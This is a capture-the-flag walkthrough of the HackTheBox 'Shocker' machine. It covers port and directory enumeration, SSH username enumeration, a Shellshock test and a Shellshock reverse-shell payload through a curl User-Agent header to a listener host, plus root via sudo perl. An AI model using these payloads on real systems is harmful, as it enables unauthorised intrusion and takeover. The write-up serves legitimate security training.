# Hackthebox Shocker

First reset the machine.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -Pn -A -T4 -p- 10.10.10.56
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 13:51 EST
Nmap scan report for 10.10.10.56
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```

Nmap vulnerability scan 

```
$ nmap --script vuln 10.10.10.56 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 13:53 EST
Nmap scan report for 10.10.10.56
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
2222/tcp open  EtherNetIP-1
```

Nmap enip-info script is used to send an Ethernet/IP packet to a remote device, and it should come back with for example the vendor information etc.

```
$ nmap -n -sV --script enip-info -p 2222 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 15:15 EST
Nmap scan report for 10.10.10.56
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It looks a lot like ssh just changed to port 2222. Run ssh-audit and see what it gives us.

Credits go to https://github.com/jtesta/ssh-audit.

```
$ python ssh-audit.py 10.10.10.56 -p 2222                                                                                                                                           1 ⨯
# general
(gen) banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
(gen) software: OpenSSH 7.2p2
(gen) compatibility: OpenSSH 7.2+, Dropbear SSH 2013.62+
(gen) compression: enabled (zlib@openssh.com)

# security
(cve) CVE-2018-15473                        -- (CVSSv2: 5.3) enumerate usernames due to timing discrepencies
(cve) CVE-2016-6515                         -- (CVSSv2: 7.8) cause DoS via long password string (crypt CPU consumption)
(cve) CVE-2015-8325                         -- (CVSSv2: 7.2) privilege escalation via triggering crafted environment

# key exchange algorithms
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256  -- [info] available since OpenSSH 4.4
(kex) diffie-hellman-group14-sha1           -- [warn] using weak hashing algorithm
                                            `- [info] available since OpenSSH 3.9, Dropbear SSH 0.53

# host-key algorithms
(key) ssh-rsa (2048-bit)                    -- [fail] using weak hashing algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2
(key) rsa-sha2-512 (2048-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (2048-bit)               -- [info] available since OpenSSH 7.2
(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5

# encryption algorithms (ciphers)
(enc) chacha20-poly1305@openssh.com         -- [info] available since OpenSSH 6.5
                                            `- [info] default cipher since OpenSSH 6.9.
(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes192-ctr                            -- [info] available since OpenSSH 3.7
(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2

# message authentication code algorithms
(mac) umac-64-etm@openssh.com               -- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 6.2
(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha1-etm@openssh.com             -- [warn] using weak hashing algorithm
                                            `- [info] available since OpenSSH 6.2
(mac) umac-64@openssh.com                   -- [warn] using encrypt-and-MAC mode
                                            `- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 4.7
(mac) umac-128@openssh.com                  -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha2-512                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha1                             -- [warn] using encrypt-and-MAC mode
                                            `- [warn] using weak hashing algorithm
                                            `- [info] available since OpenSSH 2.1.0, Dropbear SSH 0.28

# fingerprints
(fin) ssh-ed25519: SHA256:KXdrVCPcwcyZLF3Sx5LYvJK/Veiz73Nlq0yWbNF4hVo
(fin) ssh-rsa: SHA256:YCA3OrY5yOBpB8uAWI77vCTX7pf51O0Rch/A3oSWWS8

# algorithm recommendations (for OpenSSH 7.2)
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove 
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove 
(rec) -ssh-rsa                              -- key algorithm to remove 
(rec) -diffie-hellman-group14-sha1          -- kex algorithm to remove 
(rec) -hmac-sha1                            -- mac algorithm to remove 
(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove 
(rec) -hmac-sha2-256                        -- mac algorithm to remove 
(rec) -hmac-sha2-512                        -- mac algorithm to remove 
(rec) -umac-128@openssh.com                 -- mac algorithm to remove 
(rec) -umac-64-etm@openssh.com              -- mac algorithm to remove 
(rec) -umac-64@openssh.com                  -- mac algorithm to remove 

# additional info
(nfo) For hardening guides on common OSes, please see: <https://www.ssh-audit.com/hardening_guides.html>

```

ssh-keyscan provides us teh public ssh key of the server

```
$ ssh-keyscan -t rsa -p 2222 10.10.10.56                                                                                                                                            1 ⨯
# 10.10.10.56:2222 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
[10.10.10.56]:2222 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
```

And with nmap we can check the supported authentication methods

```
$ nmap -p 2222 10.10.10.56 --script ssh-auth-methods --script-args="ssh.user=root"                                              
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-26 13:01 EST
Nmap scan report for 10.10.10.56
Host is up (0.035s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

Scan the directories using feroxbuster, which found for example cgi-bin -directory, that gobuster deems not existins since it returns 403. Gobuster would need -f option as well.

```
i$ feroxbuster -u http://10.10.10.56 -f -n -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      294c http://10.10.10.56/cgi-bin/
403       11l       32w      292c http://10.10.10.56/icons/
403       11l       32w      300c http://10.10.10.56/server-status/
[####################] - 21s    29999/29999   0s      found:3       errors:0      
[####################] - 21s    29999/29999   1404/s  http://10.10.10.56
```

```
$ gobuster dir -u http://10.10.10.56 -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2021/12/26 13:49:38 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
```

Feroxbuster seems a nice tool, now search files in the cgi-bin -directory for Shellshock vulnerability.

```
$ feroxbuster -u http://10.10.10.56/cgi-bin -x sh,cgi,pl -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56/cgi-bin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [sh, cgi, pl]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        7l       17w        0c http://10.10.10.56/cgi-bin/user.sh
[####################] - 1m    119996/119996  0s      found:1       errors:3      
[####################] - 1m    119996/119996  1367/s  http://10.10.10.56/cgi-bin
```

One file user.sh found.

## Vulnerability analysis

### CVE-2018-15473

The version of the ssh is vulnerable for username enumeration. 

With a script from https://github.com/Sait-Nuri/CVE-2018-15473 it is possible to quickly verify some users that are valid.

```
$ ./CVE-2018-15473.py 10.10.10.56 -p 2222 -u root 
[+] root is a valid username
```

### Shellshock

A simple curl-command to verify the host is vulnerable to Shellshock

```
$ curl -H "User-agent: () { :;}; echo; echo vulnerable" http://10.10.10.56/cgi-bin/user.sh 
vulnerable

Content-Type: text/plain

Just an uptime test script

 09:31:28 up 21:10,  0 users,  load average: 0.00, 0.05, 0.06
```

## Initial access

### Shellshock

Easiest way is to create a reverse shell

```
$ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.20/443 0>&1" http://10.10.10.56/cgi-bin/user.sh


$ nc -nvlp 443                                                                           
listening on [any] 443 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.56] 52174
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
shelly@Shocker:/usr/lib/cgi-bin$
```

After which we can fetch the user flag

```
shelly@Shocker:/usr/lib/cgi-bin$ ls -al /home/shelly/user.txt
ls -al /home/shelly/user.txt
-r--r--r-- 1 root root 33 Sep 22  2017 /home/shelly/user.txt
shelly@Shocker:/usr/lib/cgi-bin$
```

## Privilege escalation

Gaining root is made easy, first checking sudo -l shows our user can run perl as root

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
root
ls -al /root/root.txt
-r-------- 1 root root 33 Sep 22  2017 /root/root.txt
```

